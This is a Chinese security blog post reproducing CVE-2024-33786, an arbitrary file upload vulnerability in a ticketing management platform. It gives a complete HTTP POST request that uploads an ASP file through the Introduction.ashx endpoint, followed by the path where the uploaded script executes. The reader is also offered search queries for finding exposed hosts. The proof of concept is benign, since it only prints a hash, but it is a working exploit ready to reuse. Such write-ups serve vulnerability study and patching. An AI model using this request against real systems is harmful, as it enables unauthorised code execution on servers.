#  [漏洞复现] CVE-2024-33786 中城科信票务管理平台 任意文件上传   
原创 不够安全  不够安全   2024-05-05 09:00  
  
本人非原创漏洞作者，文章仅作为知识分享用  
  
一切直接或间接由于本文所造成的后果与本人无关  
  
如有侵权，联系删除  
  
系统简介  
  
基础六管控多协同，智慧票务系统以私有/公有云为基础部署，提供票类策略管控、售票流程管控、门票核验管控、营销渠道管控、数据分析管控、财务核销管控功能，与其它业务系统数据共享，协同作业。  
```
开发语言：.Net
开发厂商：北京中成科信科技发展有限公司
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfggc8IujdsrdeBT2L7CibsSkC8XH4Z0JjocnNdIzJmlN4S3WFH3Alzv7ZM85buT91ibz4QKQapW1QjQ/640?wx_fmt=png&from=appmsg "")  
  
空间测绘  
```
回复“20240505”获取空间测绘语句
```  
  
漏洞描述  
  
中城科信票务管理平台20.04中存在任意文件上传漏洞，攻击者可以通过上传精心设计的文件来执行任意代码。  
  
影响版本  
```
v20.04
```  
  
漏洞验证  
```
POST /SystemManager/Introduction.ashx HTTP/1.1
Host: xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
Connection: close
Content-Length: 507
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: multipart/form-data; boundary=--------------------------354575237365372692397370
Accept-Encoding: gzip

----------------------------354575237365372692397370
Content-Disposition: form-data; name="file"; filename="5.txt"
Content-Type: image/jpeg

<% Response.Write("c7ff66de90f5b695091cc4826d22d137") %>

----------------------------354575237365372692397370
Content-Disposition: form-data; name="fileName"

test_20240504.asp
----------------------------354575237365372692397370
Content-Disposition: form-data; name="Method"

UpdateUploadLinkPic
----------------------------354575237365372692397370
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfggc8IujdsrdeBT2L7CibsSkFshtudkdQDpxmCSTKsh8ibSUrINqUBLGt5RicSPzUQqvp3ibtM8XOlEbg/640?wx_fmt=png&from=appmsg "")  
  
访问上传的asp文件，成功解析：  
```
http://xxx.xxx.xxx/UploadImage/20240504xxxxxx_LK.asp
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/DT3jlATYvfggc8IujdsrdeBT2L7CibsSkd2wpDXABVzUjLZAd7VeKXXibDXpic95aiad0DvpC0KfTYnvuRic4v8kzicw/640?wx_fmt=png&from=appmsg "")  
  
参考链接  
```
https://nvd.nist.gov/vuln/detail/CVE-2024-33786
https://github.com/jiankeguyue/VulnerabilityReport/blob/main/zhongcheng_kexin_ticketing_management_platform.md
https://download.csdn.net/blog/column/12593339/137506841
```  
  
**回复“20240505”获取空间测绘语句**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/DT3jlATYvfggc8IujdsrdeBT2L7CibsSkJBvFxrTH9VwIL5KMj7YpM6Kt8Fzib4cvtVdhBA7HvpM6VT7IutEicLpQ/640?wx_fmt=gif&from=appmsg "")  
  
